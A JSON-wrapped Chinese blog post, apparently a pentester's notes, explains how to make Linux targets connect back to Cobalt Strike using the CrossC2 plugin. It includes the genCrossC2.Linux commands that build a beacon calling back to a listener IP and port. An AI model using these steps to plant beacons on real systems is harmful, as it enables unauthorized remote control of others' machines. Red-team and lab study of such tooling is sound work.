            "content_html": "<h3 id=\"cs上线linux\"><a class=\"markdownIt-Anchor\" href=\"#cs上线linux\">#</a> CS 上线 linux</h3>\n<p>原版 cs 是无法上线 linux 的可用 CrossC2 此插件上线</p>\n<p>项目地址<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dsb3hlYy9Dcm9zc0My\"> https://github.com/gloxec/CrossC2</span></p>\n<p>下载三个文件</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501183439605.png\" alt=\"image-20240501183439605\"></p>\n<p>将 genCrossC2.linux 上传到 cs 目录下</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501183542240.png\" alt=\"image-20240501183542240\"></p>\n<p>将 CrossC2Kit-GithubBot-2023-11-20.zip 解压里面有两个 cna 插件加上 CrossC2-GithubBot-2023-11-20.cna 插件全部加载到 cs</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501183722758.png\" alt=\"image-20240501183722758\"></p>\n<p>监听</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501183801324.png\" alt=\"image-20240501183801324\"></p>\n<p>反向 shell 支持 http 协议，正向 shell 支持 TCP</p>\n<p>创建一个 https 的监听器</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501184353094.png\" alt=\"image-20240501184353094\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502121435711.png\" alt=\"image-20240502121435711\"></p>\n<p>先打开此文件修改下面两处</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502121725617.png\" alt=\"image-20240502121725617\"></p>\n<p>接着生成文件</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502121840504.png\" alt=\"image-20240502121840504\"></p>\n<p><code>/root/hc/cs4.8/Server/genCrossC2.Linux 192.168.0.107 4444 ./.cobaltstrike.beacon_keys null Linux x64 t_cc2.out upx 4.4</code></p>\n<p>建议在 cs 目录执行不然可能会卡住</p>\n<p><code>./genCrossC2.Linux 192.168.0.107 443 ./.cobaltstrike.beacon_keys null Linux x64 t_cc2.out</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502122026659.png\" alt=\"image-20240502122026659\"></p>\n<p>目标执行即可上线</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240502122400493.png\" alt=\"image-20240502122400493\"></p>\n",
            "tags": []
        }
    ]
}